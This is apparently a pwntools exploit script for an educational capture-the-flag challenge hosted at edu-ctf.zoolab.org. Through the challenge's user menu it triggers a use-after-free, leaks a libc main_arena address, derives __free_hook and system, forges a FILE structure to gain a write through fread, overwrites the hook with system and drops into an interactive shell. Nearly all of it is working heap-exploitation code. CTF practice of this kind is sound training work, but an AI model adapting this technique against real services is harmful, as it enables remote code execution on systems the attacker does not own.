from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#r = process("./chal")
r = remote("edu-ctf.zoolab.org","10011")
def add_user( index , username):
    r.sendlineafter( b">", b"1" )
    r.sendlineafter( b"index\n>", str(index).encode() )
    r.sendlineafter( b"username\n>", str(username).encode())

def edit_user( index, size, data):
    r.sendlineafter( b">", b"2" )
    r.sendlineafter( b"index\n>", str(index).encode() )
    r.sendlineafter( b"size\n>", str(size).encode() )
    r.send(data)

def del_user( index ):
    r.sendlineafter( b">", b"3" )
    r.sendlineafter( b"index\n>", str(index).encode() )

def show_users():
    r.sendlineafter( b">", b"4" )


add_user(0, "aaaaaaaaaa")
edit_user(0, 16, "bbbbbb")
add_user(1, "aaaaaaaaaa")
del_user(0)

add_user(2, "a")
add_user(3, "a")
edit_user(3, 8, "b")
show_users()


r.recvuntil(b"[3] a\n")
#a = hex(u64(r.recv(6)+b"\00\00"))
b = "be0"
#print("address:", a)

r.recvuntil(b"data: ")
main_arena = int(str(hex(u64(r.recv(6)+b"\00\00"))[0:11]+b),16)

free_hook = main_arena + 0x2268
system = main_arena - 0x19a950
print("main_arena", hex(main_arena))
print("free_hook", hex(free_hook))
print("system", hex(system))

size = 0x30
payload1 = flat(
    0xfbad0000, 0,
    0, 0,
    0, 0,
    0, free_hook,
    free_hook + size, 0,
    0, 0,
    0, 0x7ffff7fbc5c0,
    0x0
)


edit_user(2, 8, "A"*8)
del_user(3)
del_user(2)

edit_user(1, 0x1e0-0x10, payload1)



print("--------fread()---------")


show_users()
payload = p64((system), endian='big')
for i in range(0x200//0x8):
    print(payload[::-1])
    r.send(payload[::-1])



#gdb.attach(r)
r.interactive()